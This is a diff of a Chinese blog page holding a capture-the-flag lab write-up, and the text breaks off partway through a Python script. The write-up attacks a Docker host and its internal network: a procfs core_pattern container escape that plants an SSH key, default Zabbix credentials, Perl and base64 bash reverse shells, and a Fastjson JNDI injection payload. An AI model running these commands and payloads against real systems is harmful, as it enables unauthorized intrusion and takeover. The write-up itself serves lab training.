@@ -245,7 +245,7 @@ linux中的`/proc`目录是一个伪文件系统，其中动态反应着系统�
 <meta property="og:url" content="https://faabbi.github.io/post/GreatWall_2025.html">
 <meta property="og:image" content="https://avatars.githubusercontent.com/u/99706997?v=4">
 <title>GreatWall_2025</title>
-
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
 
 
 </head>
@@ -269,7 +269,17 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
     body {padding: 8px;}
     .postTitle{font-size:24px;}
 }
-
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
 </style>
 
 
@@ -303,11 +313,11 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
     <div id="content">
 <div class="markdown-body" id="postBody"><h1>信息收集</h1>
 <p>常规tcp udp扫描</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(root㉿MJ)-[/tmp/test/ccb]
-└─# nmap --min-rate 10000 -p1-65535 39.101.77.113
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test/ccb]
+└─<span class="pl-c"><span class="pl-c">#</span> nmap --min-rate 10000 -p1-65535 39.101.77.113</span>
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-31 12:58 CST
 Warning: 39.101.77.113 giving up on port because retransmission cap hit (10).
-Nmap scan report for 39.101.77.113
+Nmap scan report <span class="pl-k">for</span> 39.101.77.113
 Host is up (0.19s latency).
 Not shown: 58988 closed tcp ports (reset), 6544 filtered tcp ports (no-response)
 PORT     STATE SERVICE
@@ -315,28 +325,28 @@ PORT     STATE SERVICE
 80/tcp   open  http
 8080/tcp open  http-proxy
 
-Nmap done: 1 IP address (1 host up) scanned in 51.57 seconds
+Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 51.57 seconds
 
 
 ┌──(root㉿MJ)-[/tmp/test/ccb]
-└─# nmap -sU --top-ports 20 39.101.77.113
+└─<span class="pl-c"><span class="pl-c">#</span> nmap -sU --top-ports 20 39.101.77.113</span>
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-31 12:58 CST
-Nmap scan report for 39.101.77.113
+Nmap scan report <span class="pl-k">for</span> 39.101.77.113
 Host is up (0.22s latency).
 
 PORT      STATE         SERVICE
 53/udp    closed        domain
 67/udp    closed        dhcps
-68/udp    open|filtered dhcpc
+68/udp    open<span class="pl-k">|</span>filtered dhcpc
 69/udp    closed        tftp
 123/udp   closed        ntp
-135/udp   open|filtered msrpc
-137/udp   open|filtered netbios-ns
-138/udp   open|filtered netbios-dgm
-139/udp   open|filtered netbios-ssn
+135/udp   open<span class="pl-k">|</span>filtered msrpc
+137/udp   open<span class="pl-k">|</span>filtered netbios-ns
+138/udp   open<span class="pl-k">|</span>filtered netbios-dgm
+139/udp   open<span class="pl-k">|</span>filtered netbios-ssn
 161/udp   closed        snmp
 162/udp   closed        snmptrap
-445/udp   open|filtered microsoft-ds
+445/udp   open<span class="pl-k">|</span>filtered microsoft-ds
 500/udp   closed        isakmp
 514/udp   closed        syslog
 520/udp   closed        route
@@ -346,8 +356,7 @@ PORT      STATE         SERVICE
 4500/udp  closed        nat-t-ike
 49152/udp closed        unknown
 
-Nmap done: 1 IP address (1 host up) scanned in 39.09 seconds
-</code></pre>
+Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 39.09 seconds</pre></div>
 <p>仅此而已了，fscan可以接着来个poc检测，不过这个8080端口非常不稳，而且由于回显比较慢，导致挺多工具会判超时</p>
 <h1>Web</h1>
 <p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/1d1f218b-7850-495b-907d-74082d79ed8a"><img width="2000" height="1259" alt="Image" src="https://github.com/user-attachments/assets/1d1f218b-7850-495b-907d-74082d79ed8a" style="max-width: 100%; height: auto; max-height: 1259px;"></a></p>
@@ -355,14 +364,13 @@ Nmap done: 1 IP address (1 host up) scanned in 39.09 seconds
 <p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/9f2316af-77c8-4224-86a0-69eaa8a791ff"><img width="1503" height="847" alt="Image" src="https://github.com/user-attachments/assets/9f2316af-77c8-4224-86a0-69eaa8a791ff" style="max-width: 100%; height: auto; max-height: 847px;"></a></p>
 <p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/6b33248d-9d00-4903-bde2-67726e1f2185"><img width="896" height="622" alt="Image" src="https://github.com/user-attachments/assets/6b33248d-9d00-4903-bde2-67726e1f2185" style="max-width: 100%; height: auto; max-height: 622px;"></a></p>
 <h1>docker逃逸</h1>
-<pre lang="sh" class="notranslate"><code class="notranslate">
-/ &gt;id
+<div class="highlight highlight-source-shell"><pre class="notranslate">/ <span class="pl-k">&gt;</span>id
 
 uid=0(root) gid=0(root) groups=0(root)
-/ &gt;ls -al /
+/ <span class="pl-k">&gt;</span>ls -al /
 
 total 31308
-drwxr-xr-x   1 root root     4096 Sep  2 07:20 .
+drwxr-xr-x   1 root root     4096 Sep  2 07:20 <span class="pl-c1">.</span>
 drwxr-xr-x   1 root root     4096 Sep  2 07:20 ..
 -rwxr-xr-x   1 root root        0 Sep  2 07:20 .dockerenv
 drwxr-xr-x   1 root root     4096 May 12  2021 bin
@@ -386,15 +394,13 @@ dr-xr-xr-x  13 root root        0 Dec 31 04:56 sys
 drwxrwxrwt   1 root root     4096 Dec 31 04:56 tmp
 drwxr-xr-x   1 root root     4096 May 11  2021 usr
 drwxr-xr-x   1 root root     4096 May 11  2021 var
-/ &gt;
-</code></pre>
+/ <span class="pl-k">&gt;</span></pre></div>
 <p>进来就是root不过很容易发现是个docker，而且是非特权</p>
-<pre lang="sh" class="notranslate"><code class="notranslate">/ &gt;cat /proc/1/status | grep -i "seccomp"
+<div class="highlight highlight-source-shell"><pre class="notranslate">/ <span class="pl-k">&gt;</span>cat /proc/1/status <span class="pl-k">|</span> grep -i <span class="pl-s"><span class="pl-pds">"</span>seccomp<span class="pl-pds">"</span></span>
 
 Seccomp:	2
 Seccomp_filters:	1
-/ &gt;
-</code></pre>
+/ <span class="pl-k">&gt;</span></pre></div>
 <p>这里看的是这篇文章<a href="https://xz.aliyun.com/news/17111" rel="nofollow">docker逃逸方式总结分享-先知社区</a>，不过cdk直接嗦也是可以的，不过就是单纯的限制了上传文件的大小，得分挺多小块传上去的，这里手动逃逸了</p>
 <h2>Procfs危险挂载</h2>
 <p>linux中的<code class="notranslate">/proc</code>目录是一个伪文件系统，其中动态反应着系统内进程以及其他组件的状态。<br>
@@ -404,71 +410,61 @@ Seccomp_filters:	1
 利用该解析方式，可以进行容器逃逸。</p>
 <h3>1</h3>
 <p>判断 是否挂载了宿主机的 procfs，执行下面的命令，如果找到两个 <code class="notranslate">core_pattern</code> 文件那可能就是挂载了宿主机的 procfs</p>
-<pre lang="sh" class="notranslate"><code class="notranslate">/ &gt;find / -name core_pattern
+<div class="highlight highlight-source-shell"><pre class="notranslate">/ <span class="pl-k">&gt;</span>find / -name core_pattern
 
 /proc/sys/kernel/core_pattern
-/host/proc/sys/kernel/core_pattern
-</code></pre>
+/host/proc/sys/kernel/core_pattern</pre></div>
 <p>第一个是容器本身的 procfs，第二个是挂载的宿主机的 procfs</p>
 <h3>2</h3>
 <p>找到当前容器在宿主机下的绝对路径</p>
-<pre lang="sh" class="notranslate"><code class="notranslate">/ &gt;cat /proc/mounts | xargs -d ',' -n 1 | grep workdir
+<div class="highlight highlight-source-shell"><pre class="notranslate">/ <span class="pl-k">&gt;</span>cat /proc/mounts <span class="pl-k">|</span> xargs -d <span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span> -n 1 <span class="pl-k">|</span> grep workdir
 
 workdir=/var/lib/docker/overlay2/0158e7b92583381e25557d75696c90d5984f79e2abcf336a060e3b1f4c21982a/work 0 0
-/ &gt;
-</code></pre>
+/ <span class="pl-k">&gt;</span></pre></div>
 <p><strong>workdir</strong> 是分层存储的工作目录，而<strong>merged</strong> 是挂载点（即容器的文件系统视图）将路径中的 <code class="notranslate">work</code> 替换为 <code class="notranslate">merged</code> 就是当前容器在宿主机上面的绝对路径</p>
 <p>所以挂载在宿主机的绝对路径就是</p>
-<pre lang="sh" class="notranslate"><code class="notranslate">/var/lib/docker/overlay2/0158e7b92583381e25557d75696c90d5984f79e2abcf336a060e3b1f4c21982a/merged
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">/var/lib/docker/overlay2/0158e7b92583381e25557d75696c90d5984f79e2abcf336a060e3b1f4c21982a/merged</pre></div>
 <h3>3</h3>
 <p>写入恶意配置文件，然后使docker崩溃，从而执行恶意脚本，我采取写入公钥，同时必须为exp.sh加执行权限</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">cat &gt;/tmp/exp.sh &lt;&lt; EOF
-#!/bin/bash
-echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCbVBGO0cO3rPhnRBL1sy+Vl/M84FYJfGWkI5C8aLRNywiz99hQvhC90JoxdaMx3WNOykizvZu5eji7+rJcDRFsNni7AFgzV3YN0VNAlWjrIq8/2N/nxWlj/qVeF8xjMNdIU18XSCyB12++szs0rQM/gq1sQ7o6Drn1D1d7fDlUHREpliaKyhpzMl8dd5oQDs5EhJxZv+5OQSwhGQxPDCotjjahrowhsxhFxOwcnqJhXIFK2LkmHpmQa6QP4csO13zebkFEfAshoIr2capsKjwlue6Nbe7tC3vUq7ltzFSCO8Tal4823dEV90QMndlDCz1psuBTCGIB3lP2o9pdSp2L' &gt; /root/.ssh/authorized_keys
-EOF
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">cat <span class="pl-k">&gt;</span>/tmp/exp.sh <span class="pl-s"><span class="pl-k">&lt;&lt;</span> <span class="pl-k">EOF</span></span>
+<span class="pl-s">#!/bin/bash</span>
+<span class="pl-s">echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCbVBGO0cO3rPhnRBL1sy+Vl/M84FYJfGWkI5C8aLRNywiz99hQvhC90JoxdaMx3WNOykizvZu5eji7+rJcDRFsNni7AFgzV3YN0VNAlWjrIq8/2N/nxWlj/qVeF8xjMNdIU18XSCyB12++szs0rQM/gq1sQ7o6Drn1D1d7fDlUHREpliaKyhpzMl8dd5oQDs5EhJxZv+5OQSwhGQxPDCotjjahrowhsxhFxOwcnqJhXIFK2LkmHpmQa6QP4csO13zebkFEfAshoIr2capsKjwlue6Nbe7tC3vUq7ltzFSCO8Tal4823dEV90QMndlDCz1psuBTCGIB3lP2o9pdSp2L' &gt; /root/.ssh/authorized_keys</span>
+<span class="pl-s"><span class="pl-k">EOF</span></span></pre></div>
 <p>原文采取</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">echo -e "|/var/lib/docker/overlay2/a7a150eaaad31da1134fda2cb314fb3268e3e47aac8f9775c6c42743c0653ffa/merged/tmp/exp.py \rcore " &gt; /test2/proc/sys/kernel/core_pattern
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c1">echo</span> -e <span class="pl-s"><span class="pl-pds">"</span>|/var/lib/docker/overlay2/a7a150eaaad31da1134fda2cb314fb3268e3e47aac8f9775c6c42743c0653ffa/merged/tmp/exp.py \rcore <span class="pl-pds">"</span></span> <span class="pl-k">&gt;</span> /test2/proc/sys/kernel/core_pattern</pre></div>
 <p>方法，但是由于哥斯拉内存马拿到的shell是sh环境会导致双引号解析错误，如果使用单引号会导致'-e'字符串被写入到core_pattern中，所以这里采用print</p>
-<pre lang="sh" class="notranslate"><code class="notranslate">printf '|/var/lib/docker/overlay2/0158e7b92583381e25557d75696c90d5984f79e2abcf336a060e3b1f4c21982a/merged/tmp/exp.sh \rcore ' &gt; /host/proc/sys/kernel/core_pattern
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c1">printf</span> <span class="pl-s"><span class="pl-pds">'</span>|/var/lib/docker/overlay2/0158e7b92583381e25557d75696c90d5984f79e2abcf336a060e3b1f4c21982a/merged/tmp/exp.sh \rcore <span class="pl-pds">'</span></span> <span class="pl-k">&gt;</span> /host/proc/sys/kernel/core_pattern</pre></div>
 <p>接着让docker出错就行了</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">cat &gt;/tmp/exp.c &lt;&lt; EOF
-#include &lt;stdio.h&gt;
-int main(void)
-{
-    int *a = NULL;
-    *a = 1;
-    return 0;
-}
-EOF
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">cat <span class="pl-k">&gt;</span>/tmp/exp.c <span class="pl-s"><span class="pl-k">&lt;&lt;</span> <span class="pl-k">EOF</span></span>
+<span class="pl-s">#include &lt;stdio.h&gt;</span>
+<span class="pl-s">int main(void)</span>
+<span class="pl-s">{</span>
+<span class="pl-s">    int *a = NULL;</span>
+<span class="pl-s">    *a = 1;</span>
+<span class="pl-s">    return 0;</span>
+<span class="pl-s">}</span>
+<span class="pl-s"><span class="pl-k">EOF</span></span></pre></div>
 <p>因为glibc不一样，其他机器编译的拉到靶机可能没法运行，所以采用musl-libc静态编译，然后上传靶机执行</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">musl-gcc -o exp exp.c -static
+<div class="highlight highlight-source-shell"><pre class="notranslate">musl-gcc -o exp exp.c -static
 
-/root &gt;./exp
+/root <span class="pl-k">&gt;</span>./exp
 
 Segmentation fault
-/root &gt;
-</code></pre>
+/root <span class="pl-k">&gt;</span></pre></div>
 <p>到此公钥文件被写入，私钥连接即可</p>
 <h2>flag1</h2>
 <p>根下可以拿第一个flag</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">root@platform:~# cat /flag
-flag{2d7f940b-6371-4b9a-bc14-62fa9a579cfb}
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">root@platform:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> cat /flag</span>
+flag{2d7f940b-6371-4b9a-bc14-62fa9a579cfb}</pre></div>
 <h1>内网</h1>
 <p>靶机不出网，正向vshell上线即可</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(root㉿MJ)-[/tmp/test/ccb]
-└─# scp tcp_linux_amd64 root@39.101.77.113:/root/
-root@39.101.77.113's password:
-tcp_linux_amd64  
-
-root@platform:~# ./tcp_linux_amd64 &amp;
-[1] 2577
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test/ccb]
+└─<span class="pl-c"><span class="pl-c">#</span> scp tcp_linux_amd64 root@39.101.77.113:/root/</span>
+root@39.101.77.113<span class="pl-s"><span class="pl-pds">'</span>s password:</span>
+<span class="pl-s">tcp_linux_amd64  </span>
+<span class="pl-s"></span>
+<span class="pl-s">root@platform:~# ./tcp_linux_amd64 &amp;</span>
+<span class="pl-s">[1] 2577</span></pre></div>
 <p>fscan扫一下，有用信息如下</p>
 <pre lang="text" class="notranslate"><code class="notranslate">(icmp) Target 172.16.22.14    is alive
 (icmp) Target 172.16.22.41    is alive
@@ -496,17 +492,15 @@ start vulscan
 </code></pre>
 <h2>172.16.22.14</h2>
 <p>只开放了80和22，80是个apache的默认页面，做目录扫描可以发现存在zabbix</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(root㉿MJ)-[/tmp/test/ccb]
-└─# pc dirsearch -u http://172.16.22.14/
-[13:35:25] 200 -    1KB - /zabbix/
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test/ccb]
+└─<span class="pl-c"><span class="pl-c">#</span> pc dirsearch -u http://172.16.22.14/</span>
+[13:35:25] 200 -    1KB - /zabbix/</pre></div>
 <p>默认密码Admin/zabbix</p>
 <p>告警里面改下脚本命令反弹shell即可</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">perl -e 'use Socket;$i="172.16.22.12";$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/bash -i");};'
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">perl -e <span class="pl-s"><span class="pl-pds">'</span>use Socket;$i="172.16.22.12";$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/bash -i");};<span class="pl-pds">'</span></span></pre></div>
 <p>同样没新的内网段了，那这个就到此为止了</p>
 <h2>flag2</h2>
-<pre lang="bash" class="notranslate"><code class="notranslate">zabbix@zabbix:/$ find / -perm -4000 2&gt;/dev/null
+<div class="highlight highlight-source-shell"><pre class="notranslate">zabbix@zabbix:/$ find / -perm -4000 <span class="pl-k">2&gt;</span>/dev/null
 /usr/bin/pkexec
 /usr/bin/umount
 /usr/bin/gpasswd
@@ -521,10 +515,9 @@ start vulscan
 /usr/bin/newgrp
 /usr/bin/sudo
 zabbix@zabbix:/$ ss -a -F /flag.txt
-Error: an inet prefix is expected rather than "flag{a48837f5-a716-410b-85af-6fb0ab4ed56e}".
+Error: an inet prefix is expected rather than <span class="pl-s"><span class="pl-pds">"</span>flag{a48837f5-a716-410b-85af-6fb0ab4ed56e}<span class="pl-pds">"</span></span>.
 Cannot parse dst/src address.
-zabbix@zabbix:/$
-</code></pre>
+zabbix@zabbix:/$</pre></div>
 <h2>172.16.22.88</h2>
 <p>开放22，80，8080端口</p>
 <p>访问80可以下载个apk包，wget下来转jar分析，不会逆向参考wp写的，不够能搜到的wp对不熟悉相关知识的真实太不友好</p>
@@ -534,155 +527,152 @@ jndi注入参考<a href="https://blog.csdn.net/2301_79837041/article/details/137
 <p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/6f9ea00a-f76f-427e-ac07-ab93abb05db5"><img width="2000" height="1071" alt="Image" src="https://github.com/user-attachments/assets/6f9ea00a-f76f-427e-ac07-ab93abb05db5" style="max-width: 100%; height: auto; max-height: 1071px;"></a></p>
 <p>可以看到版本1.2.24和key，这个版本没有做任何过滤，这里不解释原因了，因为我也不会，只能说交给逆向手或者大牛子了</p>
 <p>内网主机开rmi服务反弹shell</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">root@platform:~/test# java -jar jdni-inject.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTYuMjIuMTIvMjMzMSAwPiYx}|{base64,-d}|{bash,-i}" -A "172.16.22.12"
-[ADDRESS] &gt;&gt; 172.16.22.12
-[COMMAND] &gt;&gt; bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTYuMjIuMTIvMjMzMSAwPiYx}|{base64,-d}|{bash,-i}
+<div class="highlight highlight-source-shell"><pre class="notranslate">root@platform:<span class="pl-k">~</span>/test# java -jar jdni-inject.jar -C <span class="pl-s"><span class="pl-pds">"</span>bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTYuMjIuMTIvMjMzMSAwPiYx}|{base64,-d}|{bash,-i}<span class="pl-pds">"</span></span> -A <span class="pl-s"><span class="pl-pds">"</span>172.16.22.12<span class="pl-pds">"</span></span>
+[ADDRESS] <span class="pl-k">&gt;&gt;</span> 172.16.22.12
+[COMMAND] <span class="pl-k">&gt;&gt;</span> bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTYuMjIuMTIvMjMzMSAwPiYx}<span class="pl-k">|</span>{base64,-d}<span class="pl-k">|</span>{bash,-i}
 ----------------------------JNDI Links----------------------------
-Target environment(Build in JDK whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath):
+Target environment(Build <span class="pl-k">in</span> JDK whose trustURLCodebase is <span class="pl-c1">false</span> and have Tomcat 8+ or SpringBoot 1.2.x+ <span class="pl-k">in</span> classpath):
 rmi://172.16.22.12:1099/zeeje2
-Target environment(Build in JDK 1.8 whose trustURLCodebase is true):
+Target environment(Build <span class="pl-k">in</span> JDK 1.8 whose trustURLCodebase is true):
 rmi://172.16.22.12:1099/opnefm
 ldap://172.16.22.12:1389/opnefm
-Target environment(Build in JDK 1.7 whose trustURLCodebase is true):
+Target environment(Build <span class="pl-k">in</span> JDK 1.7 whose trustURLCodebase is true):
 rmi://172.16.22.12:1099/daedal
 ldap://172.16.22.12:1389/daedal
 
 ----------------------------Server Log----------------------------
-2025-12-31 16:00:56 [JETTYSERVER]&gt;&gt; Listening on 0.0.0.0:8180
-2025-12-31 16:00:56 [RMISERVER]  &gt;&gt; Listening on 0.0.0.0:1099
-2025-12-31 16:00:56 [LDAPSERVER] &gt;&gt; Listening on 0.0.0.0:1389
-2025-12-31 16:13:07 [RMISERVER]  &gt;&gt; Have connection from /172.16.22.88:34710
-2025-12-31 16:13:13 [RMISERVER]  &gt;&gt; Reading message...
-2025-12-31 16:13:13 [RMISERVER]  &gt;&gt; Is RMI.lookup call for zeeje2 2
-2025-12-31 16:13:13 [RMISERVER]  &gt;&gt; Sending local classloading reference.
-2025-12-31 16:13:13 [RMISERVER]  &gt;&gt; Closing connection
-</code></pre>
+2025-12-31 16:00:56 [JETTYSERVER]<span class="pl-k">&gt;&gt;</span> Listening on 0.0.0.0:8180
+2025-12-31 16:00:56 [RMISERVER]  <span class="pl-k">&gt;&gt;</span> Listening on 0.0.0.0:1099
+2025-12-31 16:00:56 [LDAPSERVER] <span class="pl-k">&gt;&gt;</span> Listening on 0.0.0.0:1389
+2025-12-31 16:13:07 [RMISERVER]  <span class="pl-k">&gt;&gt;</span> Have connection from /172.16.22.88:34710
+2025-12-31 16:13:13 [RMISERVER]  <span class="pl-k">&gt;&gt;</span> Reading message...
+2025-12-31 16:13:13 [RMISERVER]  <span class="pl-k">&gt;&gt;</span> Is RMI.lookup call <span class="pl-k">for</span> zeeje2 2
+2025-12-31 16:13:13 [RMISERVER]  <span class="pl-k">&gt;&gt;</span> Sending <span class="pl-k">local</span> classloading reference.
+2025-12-31 16:13:13 [RMISERVER]  <span class="pl-k">&gt;&gt;</span> Closing connection</pre></div>
 <p>另起shell开监听</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">root@platform:~# nc -lvnp 2331
-Listening on 0.0.0.0 2331
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">root@platform:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> nc -lvnp 2331</span>
+Listening on 0.0.0.0 2331</pre></div>
 <h3>脚本</h3>
-<pre lang="python" class="notranslate"><code class="notranslate">import base64
-import os
-import json
-import requests
-from cryptography.hazmat.primitives import serialization, hashes
-from cryptography.hazmat.primitives.asymmetric import padding
-from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-from cryptography.hazmat.backends import default_backend
+<div class="highlight highlight-source-python"><pre class="notranslate"><span class="pl-k">import</span> <span class="pl-s1">base64</span>
+<span class="pl-k">import</span> <span class="pl-s1">os</span>
+<span class="pl-k">import</span> <span class="pl-s1">json</span>
+<span class="pl-k">import</span> <span class="pl-s1">requests</span>
+<span class="pl-k">from</span> <span class="pl-s1">cryptography</span>.<span class="pl-s1">hazmat</span>.<span class="pl-s1">primitives</span> <span class="pl-k">import</span> <span class="pl-s1">serialization</span>, <span class="pl-s1">hashes</span>
+<span class="pl-k">from</span> <span class="pl-s1">cryptography</span>.<span class="pl-s1">hazmat</span>.<span class="pl-s1">primitives</span>.<span class="pl-s1">asymmetric</span> <span class="pl-k">import</span> <span class="pl-s1">padding</span>
+<span class="pl-k">from</span> <span class="pl-s1">cryptography</span>.<span class="pl-s1">hazmat</span>.<span class="pl-s1">primitives</span>.<span class="pl-s1">ciphers</span> <span class="pl-k">import</span> <span class="pl-v">Cipher</span>, <span class="pl-s1">algorithms</span>, <span class="pl-s1">modes</span>
+<span class="pl-k">from</span> <span class="pl-s1">cryptography</span>.<span class="pl-s1">hazmat</span>.<span class="pl-s1">backends</span> <span class="pl-k">import</span> <span class="pl-s1">default_backend</span>
 
 
-# ===== 配置信息 =====
-SERVER_URL = "http://172.16.22.88:8080/api/login"
-PUBLIC_KEY_B64 = (
-    "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAnKum2FOeaPQumhLBpRauv+OMB6pkdqAC"
-    "jbZYkzzP8CZgjwEwmKauXLxzur1beldNDlVnUs83CnnvanPIYW3oP56t0SoqDmWviBTBJ2aCjtrz"
-    "tFYjBixZEYJ2Exp9f6cdFuSMiucPyuhwY8AuFWnGPJ3Mwt8L8ouV9Lc6Ptp67fCZ0aHr1BVu+pXv"
-    "HVktbcmeCt+61dnyd9iXTDZfIQ9rwrDsTlkEYORN0hckpFWvgaoNXhXm60ioLkk/qtPZSjir0bpD"
-    "L0w0iZ3+wRJLtUOe3KyGx+C00S5w2cM0Zw1XlmRQ08yj1nObVkaVsfEU8sSk/XFVnuCrO9YfQCa1"
-    "uxm5ZQIDAQAB"
+<span class="pl-c"># ===== 配置信息 =====</span>
+<span class="pl-c1">SERVER_URL</span> <span class="pl-c1">=</span> <span class="pl-s">"http://172.16.22.88:8080/api/login"</span>
+<span class="pl-v">PUBLIC_KEY_B64</span> <span class="pl-c1">=</span> (
+    <span class="pl-s">"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAnKum2FOeaPQumhLBpRauv+OMB6pkdqAC"</span>
+    <span class="pl-s">"jbZYkzzP8CZgjwEwmKauXLxzur1beldNDlVnUs83CnnvanPIYW3oP56t0SoqDmWviBTBJ2aCjtrz"</span>
+    <span class="pl-s">"tFYjBixZEYJ2Exp9f6cdFuSMiucPyuhwY8AuFWnGPJ3Mwt8L8ouV9Lc6Ptp67fCZ0aHr1BVu+pXv"</span>
+    <span class="pl-s">"HVktbcmeCt+61dnyd9iXTDZfIQ9rwrDsTlkEYORN0hckpFWvgaoNXhXm60ioLkk/qtPZSjir0bpD"</span>
+    <span class="pl-s">"L0w0iZ3+wRJLtUOe3KyGx+C00S5w2cM0Zw1XlmRQ08yj1nObVkaVsfEU8sSk/XFVnuCrO9YfQCa1"</span>
+    <span class="pl-s">"uxm5ZQIDAQAB"</span>
 )
 
 
-def main():
-    # ===== 1. 要发送的 JSON 明文 =====
-    plaintext = """{
-        "@type": "com.sun.rowset.JdbcRowSetImpl",
-        "dataSourceName": "rmi://172.16.22.12:1099/zeeje2",
-        "autoCommit": true
-    }"""
+<span class="pl-k">def</span> <span class="pl-en">main</span>():
+    <span class="pl-c"># ===== 1. 要发送的 JSON 明文 =====</span>
+    <span class="pl-s1">plaintext</span> <span class="pl-c1">=</span> <span class="pl-s">"""{</span>
+<span class="pl-s">        "@type": "com.sun.rowset.JdbcRowSetImpl",</span>
+<span class="pl-s">        "dataSourceName": "rmi://172.16.22.12:1099/zeeje2",</span>
+<span class="pl-s">        "autoCommit": true</span>
+<span class="pl-s">    }"""</span>
 
-    print("待加密的 JSON 数据:")
-    print(plaintext)
-    print("-" * 50)
+    <span class="pl-en">print</span>(<span class="pl-s">"待加密的 JSON 数据:"</span>)
+    <span class="pl-en">print</span>(<span class="pl-s1">plaintext</span>)
+    <span class="pl-en">print</span>(<span class="pl-s">"-"</span> <span class="pl-c1">*</span> <span class="pl-c1">50</span>)
 
-    # ===== 2. 生成随机 AES 密钥 (128-bit) =====
-    aes_key = os.urandom(16)
-    print(f"生成的 AES 密钥长度: {len(aes_key)} 字节")
+    <span class="pl-c"># ===== 2. 生成随机 AES 密钥 (128-bit) =====</span>
+    <span class="pl-s1">aes_key</span> <span class="pl-c1">=</span> <span class="pl-s1">os</span>.<span class="pl-c1">urandom</span>(<span class="pl-c1">16</span>)
+    <span class="pl-en">print</span>(<span class="pl-s">f"生成的 AES 密钥长度: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-en">len</span>(<span class="pl-s1">aes_key</span>)<span class="pl-kos">}</span></span> 字节"</span>)
 
-    # ===== 3. AES/GCM 加密 =====
-    iv = os.urandom(12)  # 12 字节初始化向量
-    print(f"生成的 IV 长度: {len(iv)} 字节")
+    <span class="pl-c"># ===== 3. AES/GCM 加密 =====</span>
+    <span class="pl-s1">iv</span> <span class="pl-c1">=</span> <span class="pl-s1">os</span>.<span class="pl-c1">urandom</span>(<span class="pl-c1">12</span>)  <span class="pl-c"># 12 字节初始化向量</span>
+    <span class="pl-en">print</span>(<span class="pl-s">f"生成的 IV 长度: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-en">len</span>(<span class="pl-s1">iv</span>)<span class="pl-kos">}</span></span> 字节"</span>)
 
-    encryptor = Cipher(
-        algorithms.AES(aes_key),
-        modes.GCM(iv),
-        backend=default_backend()
-    ).encryptor()
+    <span class="pl-s1">encryptor</span> <span class="pl-c1">=</span> <span class="pl-en">Cipher</span>(
+        <span class="pl-s1">algorithms</span>.<span class="pl-c1">AES</span>(<span class="pl-s1">aes_key</span>),
+        <span class="pl-s1">modes</span>.<span class="pl-c1">GCM</span>(<span class="pl-s1">iv</span>),
+        <span class="pl-s1">backend</span><span class="pl-c1">=</span><span class="pl-en">default_backend</span>()
+    ).<span class="pl-c1">encryptor</span>()
 
-    ciphertext = encryptor.update(plaintext.encode("utf-8"))
-    ciphertext += encryptor.finalize()
-    tag = encryptor.tag
